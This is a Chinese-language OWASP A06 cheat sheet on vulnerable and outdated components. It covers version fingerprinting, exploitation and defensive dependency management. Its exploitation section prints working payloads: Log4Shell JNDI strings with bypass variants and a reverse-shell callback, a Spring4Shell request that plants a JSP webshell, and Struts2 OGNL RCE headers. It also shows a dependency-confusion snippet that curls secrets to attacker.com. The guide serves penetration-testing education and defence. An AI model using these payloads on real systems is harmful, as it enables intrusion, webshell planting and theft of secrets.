# 📦 易受攻击和过时的组件（A06: Vulnerable and Outdated Components）全技巧

> **OWASP Top 10 2021 — 第6位**  
> 使用已知存在漏洞的、过时的或不受支持的第三方组件。

---

## 📋 一、漏洞基础

### 1.1 什么是组件漏洞？

现代应用大量依赖第三方库、框架、中间件等组件。如果这些组件**版本过旧**或**不再维护**，攻击者可利用已知的CVE漏洞进行攻击。

### 1.2 常见场景

| 场景 | 说明 | 示例 |
|------|------|------|
| 🚫 **已知CVE组件** | 使用含已知漏洞的库 | 旧版Spring/Struts |
| 🚫 **废弃组件** | 不再维护的库 | jQuery 1.x, AngularJS |
| 🚫 **直接依赖漏洞** | 项目直接引用的库有漏洞 | Log4j 2.x < 2.17 |
| 🚫 **传递依赖漏洞** | 依赖的依赖有漏洞 | 间接引入有问题的库 |
| 🚫 **过时中间件** | 服务器软件版本过旧 | Apache 2.2, Nginx 1.6 |
| 🚫 **未打补丁** | 已知漏洞但未更新 | 已发布补丁但未安装 |

### 1.3 危害

- 已知漏洞利用（已有公开PoC/EXP）
- 远程代码执行（RCE）
- 数据泄露
- 拒绝服务（DoS）
- 供应链连锁攻击

---

## 🔍 二、基础检测技巧

### 2.1 版本信息收集

```bash
# 从HTTP头获取服务器版本
curl -sI https://target.com | grep -i "server\|x-powered-by"

# 从页面内容获取版本
curl -s https://target.com | grep -i "version\|v[\d.]+"

# 特定CMS版本检测
curl -s https://target.com/wp-content/ | head -1
curl -s https://target.com/CHANGELOG.txt
curl -s https://target.com/readme.html

# JavaScript库版本
curl -s https://target.com/static/js/main.js | grep -i "version\|@version\|v[\d.]+"
```

### 2.2 自动化版本检测

```bash
# 使用 WhatWeb 识别技术栈
whatweb https://target.com

# 使用 Wappalyzer (浏览器插件)
# 或在命令行使用
wappalyzer-cli https://target.com

# 使用 BuiltWith API
curl "https://api.builtwith.com/v21/api.json?KEY=xxx&LOOKUP=target.com"
```

### 2.3 已知漏洞搜索

```bash
# 搜索CVE
searchsploit apache 2.4.49
searchsploit spring framework
searchsploit log4j

# 查询NVD
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=log4j"

# 使用 osv.dev 查询
curl "https://api.osv.dev/v1/query" \
  -d '{"package":{"name":"lodash","ecosystem":"npm"},"version":"4.17.19"}'
```

### 2.4 依赖扫描

```bash
# 前端依赖检测
# 查看 package.json（如果暴露）
curl -s https://target.com/package.json

# 查看 yarn.lock / package-lock.json
curl -s https://target.com/yarn.lock | head -50

# 后端依赖检测
# Maven pom.xml
curl -s https://target.com/pom.xml

# Composer
curl -s https://target.com/composer.json

# Pip requirements.txt
curl -s https://target.com/requirements.txt
```

---

## 🚀 三、进阶利用技巧

### 3.1 Log4Shell (CVE-2021-44228) 利用

```bash
# 检测Log4j漏洞
# 使用DNSLog/交互式平台

# JNDI注入检测 payload
${jndi:ldap://xxxx.dnslog.cn/a}
${jndi:dns://xxxx.dnslog.cn/a}

# 多种绕过方式
${${lower:j}ndi:${lower:l}dap://xxxx.dnslog.cn/a}
${${env:ENV_NAME:-j}ndi:${env:ENV_NAME:-l}dap://xxxx.dnslog.cn/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://xxxx.dnslog.cn/a}

# RCE利用
# 使用 JNDIExploit 或 marshalsec 搭建LDAP服务
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i your_ip -p 8888

# 发送payload
${jndi:ldap://your_ip:1389/Deserialization/CommonsCollectionsK1/ReverseShell/your_ip/4444}
```

### 3.2 Spring4Shell (CVE-2022-22965) 利用

```bash
# 检测Spring框架
# 访问Spring相关端点
curl -s https://target.com/spring/actuator
curl -s https://target.com/actuator

# RCE利用
# 通过修改classpath下的日志配置写入webshell
curl -X POST https://target.com/spring4shell-demo/helloworld \
  -H "suffix: %>//" \
  -H "c1: Runtime" \
  -H "c2: <%" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatWarDeployer&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
```

### 3.3 Apache Struts2 漏洞利用

```bash
# S2-045 (CVE-2017-5638) - Content-Type RCE
curl -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=@java.lang.System@getProperty('os.name').toLowerCase().contains('win')).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
  -d "x=" https://target.com/struts2-showcase/

# S2-032 (CVE-2016-3081) - Method RCE
curl -X POST \
  -d "method:%23%23%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23%23%23a.exec('id')" \
  https://target.com/struts2-rest-showcase/
```

### 3.4 WordPress 组件漏洞

```bash
# 检测WP版本
curl -s https://target.com/ | grep "generator"

# 枚举已安装插件
curl -s https://target.com/wp-content/plugins/ | grep -oP 'href="([^/]+)/"' | sort -u

# 检测插件版本
curl -s https://target.com/wp-content/plugins/plugin-name/readme.txt | grep "Stable tag"

# 利用已知插件漏洞
# wpscan --enumerate vp --plugins-detection aggressive
wpscan --url https://target.com --enumerate vp,vt

# 主题漏洞检测
wpscan --url https://target.com --enumerate t
```

### 3.5 供应链攻击 - 依赖混淆

```python
# 依赖混淆（Dependency Confusion）
# 当私有包名与公共包名相同时，包管理器可能安装公共包

# 攻击流程
# 1. 确定目标使用的私有包名（从package.json等）
# 2. 在npm/PyPI/rubygems注册同名公共包
# 3. 包含恶意代码
# 4. 等待目标的CI/CD自动安装

# npm 依赖混淆 payload 示例
# index.js
const { exec } = require('child_process');
exec('curl http://attacker.com/steal?token=$(cat /etc/secret)');
```

### 3.6 容器镜像漏洞

```bash
# 检查容器中的过时组件
# 如果目标使用Docker，查看Dockerfile
curl -s https://target.com/Dockerfile

# 检测基础镜像的已知漏洞
# 常用基础镜像漏洞base image版本
# node:14 → 多个漏洞
# python:3.6 → 已停止安全更新
# ubuntu:18.04 → 已停止支持
# alpine:3.12 → 过时

# 常见Java中间件漏洞版本
# Tomcat < 9.0.62 → CVE-2022-22965
# Spring Framework < 5.3.18 → CVE-2022-22965
# Log4j 2.x < 2.17.0 → CVE-2021-44832
# Struts2 < 2.5.30 → 多个RCE
```

### 3.7 识别传递依赖攻击面

```json
// 从package-lock.json分析传递依赖
// 即使项目直接依赖的库没问题，其依赖的依赖可能有问题

// 示例：项目依赖 A v1.0.0
// A v1.0.0 依赖 B v2.0.0
// B v2.0.0 有已知漏洞 CVE-2024-XXXX

// 使用 npm audit 检查
npm audit --json

// 使用 yarn audit
yarn audit --json

// Python
pip audit

// Java Maven
mvn dependency-check:check
```

---

## 🛡️ 四、防御方案

### 4.1 依赖管理最佳实践

```bash
# 1. 建立SBOM（软件物料清单）
# 使用 CycloneDX 生成
mvn org.cyclonedx:cyclonedx-maven-plugin:makeBom

# 2. 持续依赖扫描
# GitHub Dependabot
# GitLab Dependency Scanning
# Snyk / WhiteSource

# 3. 定期更新
npm update
pip install --upgrade
mvn versions:display-dependency-updates

# 4. 锁定依赖版本
# npm: package-lock.json
# pip: requirements.txt + pip freeze
# Maven: maven-dependency-plugin
```

### 4.2 自动漏洞扫描集成

```yaml
# GitHub Actions 示例
name: Dependency Security Scan
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Run Snyk Security Scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
      
      - name: Run Trivy
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-results.sarif'
```

### 4.3 组件版本规则

| 类别 | 策略 | 检查频率 |
|------|------|----------|
| 🔴 高危漏洞 | 立即升级 | 持续监控 |
| 🟠 中危漏洞 | 7天内升级 | 每周检查 |
| 🟡 低危漏洞 | 下次发布升级 | 每月检查 |
| ✅ 主版本更新 | 评估后升级 | 季度检查 |
| ⭕ 废弃组件 | 立即替换 | 持续监控 |

### 4.4 容器镜像安全

```dockerfile
# Dockerfile 安全最佳实践
# 使用明确版本标签（不用latest）
FROM node:20-alpine

# 安装安全更新
RUN apk update && apk upgrade

# 使用非root用户
USER node

# 多阶段构建 - 最终镜像不包含构建工具
# 构建阶段
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
RUN npm run build

# 运行阶段
FROM node:20-alpine
COPY --from=builder /app/dist ./dist
USER node
CMD ["node", "dist/main.js"]
```

### 4.5 关键组件安全版本速查

| 组件 | 安全版本 | 需避免的版本 |
|------|----------|-------------|
| Log4j | >= 2.17.0 | < 2.17.0 |
| Spring Framework | >= 5.3.18 / 6.0.6 | < 5.3.18 |
| Spring Boot | >= 2.6.6 / 2.7.0 | < 2.6.6 |
| Apache Tomcat | >= 10.0.20 / 9.0.62 | < 9.0.62 |
| Apache Struts2 | >= 2.5.30 | < 2.5.30 |
| OpenSSL | >= 1.1.1t / 3.0.8 | < 1.1.1t |
| jQuery | >= 3.5.0 | < 3.5.0 |
| Node.js | >= 18.x LTS | < 16.x |
| Python | >= 3.11 | < 3.8 |

---

## 🎯 五、实战检查清单

### 5.1 渗透测试要点

- [ ] 识别目标使用的所有第三方组件及版本
- [ ] 搜索每个组件的已知CVE漏洞
- [ ] 测试常见的高危漏洞（Log4j/Struts2/Spring4Shell）
- [ ] 检查是否有废弃/不再维护的组件
- [ ] 检查传递依赖是否安全
- [ ] 测试是否存在依赖混淆风险
- [ ] 检查容器镜像是否包含已知漏洞
- [ ] 检查是否能通过组件漏洞获得RCE

### 5.2 推荐工具

| 工具 | 用途 |
|------|------|
| Snyk | 依赖漏洞扫描 |
| Trivy | 容器/文件系统扫描 |
| Dependabot | GitHub自动依赖更新 |
| OWASP Dependency-Check | Java/.NET依赖检查 |
| npm audit / yarn audit | Node.js依赖审计 |
| pip-audit | Python依赖审计 |
| searchsploit | 漏洞利用搜索 |
| nuclei | 模板化漏洞扫描（含组件漏洞模板） |

---

> **💡 核心原则**：维护一个完整的软件物料清单（SBOM），持续监控所有组件的已知漏洞，保持"零日意识"——不是在漏洞公布后才更新，而是主动持续更新！
